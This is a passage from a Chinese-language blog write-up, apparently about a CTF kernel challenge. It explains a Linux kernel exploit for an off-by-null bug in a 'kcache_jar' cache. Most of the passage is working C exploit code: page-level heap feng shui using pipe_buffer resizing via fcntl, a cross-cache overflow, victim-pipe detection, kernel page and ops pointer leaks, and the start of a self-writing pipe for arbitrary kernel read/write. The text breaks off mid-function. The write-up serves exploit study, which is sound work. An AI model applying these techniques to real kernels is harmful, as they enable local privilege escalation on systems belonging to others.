class="line">&#125;</span><br></pre></td></tr></table></figure><p>使得之后分配的页都是高阶拆分下来的连续页,之所以后面还要隔几个释放一个,是因为socket产生的噪声,为了尽量避免其拆散高阶连续页,所以释放之前申请的给其使用</p><p>现在面临的一个问题是</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;li&gt;</span></span><br><span class="line">kcache_jar            16     16   2048   16    8 : tunables    0    0    0 : slabdata      1   0</span><br><span class="line">kmalloc-cg-1k         94    160   1024   16    4 : tunables    0    0    0 : slabdata     10   0</span><br><span class="line">dma-kmalloc-4k         0      0   4096    8    8 : tunables    0    0    0 : slabdata      0   0</span><br></pre></td></tr></table></figure><p>页级堆风水要保证成功率,最好是向同一个order申请</p><p><code>kcache_jar</code>所在的分配器每一次申请slab都是申请8页也就是order3</p><p>而<code>pipe_buffer</code>默认创建16个大小是<code>640</code>是向<code>kmalloc-cg-1k</code>申请,并在耗尽时向order2申请</p><p>但要想保证较高的成功率,我们需要想办法使得二者是向同阶的order申请,<code>kcache_jar</code>显然没法改</p><p>但<code>pipe_buffer</code>并不是改不了</p><p>fcntl提供了接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">pipe_fcntl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    pipe = get_pipe_info(file, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">    __pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> F_SETPIPE_SZ:</span><br><span class="line">        ret = pipe_set_size(pipe, arg);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_set_size</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">    bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">               GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br></pre></td></tr></table></figure><p>我们可以通过这个改变pipe_buffer申请obj的slab</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">extend_pipe_buffer_to_4k</span><span class="params">(<span class="type">int</span> start_idx, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外我们再选择将kcache_jar的slab夹在pipe_buffer的slab中间,以此来提高成功率</p><p>对应exp代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(<span class="number">0</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">    free_page(pgv_8pages_start_idx++);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_alloc(i, <span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="number">2</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    .......</span><br><span class="line">            <span class="comment">/* try to trigger cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_append(i, KCACHE_SIZE - <span class="number">8</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    .......</span><br></pre></td></tr></table></figure><p>至此<code>off-by-null</code>利用完成</p><h3 id="第一次uaf"><a href="#第一次uaf" class="headerlink" title="第一次uaf"></a>第一次uaf</h3><p>在上一步我们完成了<code>off-by-null</code>的利用</p><p>如果一切顺利,那么我们现在已经掌握了一个可以uaf的页</p><p>如何检测是否成功拿到了这个页呢</p><p>首先我们在触发<code>off-by-null</code>之前先向所有管道写入一些标识信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);  <span class="comment">/* prevent pipe_release() */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么当<code>off-by-null</code>触发之后,如果我们再次遍历读取所有管道,如果一个管道发现其读取出的整型nr与当前游标i不同,那么我们就可以确认这个管道的pipe_buffer就是被<code>off-by-null</code>的那个</p><p>即<code>pipe[nr]</code>是被<code>off-by-null</code>的那个,<code>pipe[i]</code>是与其重叠那个原管道</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* checking for cross-cache overflow */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a3_str, <span class="string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">        orig_pid = nr;</span><br><span class="line">        victim_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, </span><br><span class="line">               victim_pid, orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (victim_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有人可能会好奇,为什么找到了victim后就直接break了,这样不是会有可能略过orig的读取,从而导致之后的读写不一致吗</p><p>这个因为其之后的操作都是基于victim的,所以不必担心</p><hr><p>不过还有一个疑问,就是一种极端情况</p><p>如果i=0时,就找到了victim,那么之后所有的pipe就都没进行读取,这样在第二次uaf的判断中,读取时不就会出现错误嘛</p><p>所以我个人认为可以就算找到了victim也不break,而是继续向下执行直到遍历完所有的pipe</p><p>当然其实必要性也不大,毕竟这个概率太小了,但我试了一下去除break其实确实是可行的</p><h3 id="第二次uaf"><a href="#第二次uaf" class="headerlink" title="第二次uaf"></a>第二次uaf</h3><p>现在我们已经有了一个可以uaf的页,并且可以读写上面的所有内容</p><p>我们首先释放这个uaf页,使其回到伙伴系统</p><p>之后再次利用fcntl修改剩余<code>pipe_buffer</code>的大小,使其重新分配,且刚好取出这个页作为slab</p><p>需要注意的是,因为之后还需要一次更改<code>pipe_buffer</code>大小,所以这次更改的大小要稍微讲究一些,即其所在slab是向order1申请内存,且objsize应该大于80,并刚好被2的幂次个pipe_buffer结构体选中作为obj</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kmalloc-cg-192       504    504    192   21    1 : tunables    0    0    0 : slabdata     24   0</span><br><span class="line">kmalloc-cg-96        252    252     96   42    1 : tunables    0    0    0 : slabdata      6   0</span><br></pre></td></tr></table></figure><p>我们选中这两个作为目标</p><p>所以此次我们需要修改的大小是<code>0x2000</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><hr><p>在进一步解析之前先提一下<code>pipe_buffer</code>结构体中<code>offset</code>与<code>len</code>两个字段的作用</p><p><code>offset</code>指向未读取的数据偏移</p><p><code>len</code>代表未读取得数据得长度</p><p>也就是说</p><ul><li>对一个pipe进行read操作是从offset开始的,最多读取len长度</li><li>对一个pipe进行write操作是从offset+len处开始写起的</li></ul><p>因此我们可以看到exp中有很多用于平衡读写的操作</p><hr><p>继续exp的分析,在平衡好读写后,我们便可以读取到一个pipe_buffer的完整结构</p><p>然后我们再将其写到下一个pipe_buffer,这样我们又构造了一个uaf</p><p>之后用同样的办法找到目标管道</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span></span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> </span><br><span class="line">       <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, </span><br><span class="line">       info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>) info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span></span><br><span class="line">    || (<span class="type">size_t</span>) info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* construct a second-level page uaf */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">info_pipe_buf.page = (<span class="keyword">struct</span> page*) ((<span class="type">size_t</span>) info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;</span><br><span class="line">        snd_orig_pid = nr;</span><br><span class="line">        snd_vicitm_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, </span><br><span class="line">               snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这一句</p><p><code>info_pipe_buf.page = (struct page*) ((size_t) info_pipe_buf.page + 0x40);</code></p><p><code>arttnba3</code>大佬将page指针+0x40之后才将其写到下一个pipe_buffer</p><p>而我认为这是没有必要的,甚至加了这一句之后其实反而不太好理解了,甚至如果不是random_list的作用,还可能下一个pipe_buffer的page本身就是读出的page指针+0x40</p><p>所以这一句代码是完全可以去除的,而我在去除后编译出的exp同样利用成功了,证实了我的猜测</p><h3 id="构建自写管道"><a href="#构建自写管道" class="headerlink" title="构建自写管道"></a>构建自写管道</h3><p>现在我们拥有了对应第二个uaf页的<code>struct page</code>指针</p><p>并且还能任意写第二个uaf页上的pipe_buffer结构体</p><p>那么不是可以控制其上的pipe_buffer指向自身所在页,进而控制pipe_buffer本身</p><p>这里我们需要控制三个pipe_buffer</p><p>从低到高我们分别称作A,B,C,</p><p>其中</p><ul><li>A用于任意读写</li><li>C负责控制A任意读写的范围,并在写完A后,向后移继续写B,使得B指向C</li><li>B负责将C重新指向A</li></ul><p>获取这三个pipe_buffer的方法和前面两步差不多,就不多说了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">building_self_writing_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> <span class="number">-3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span 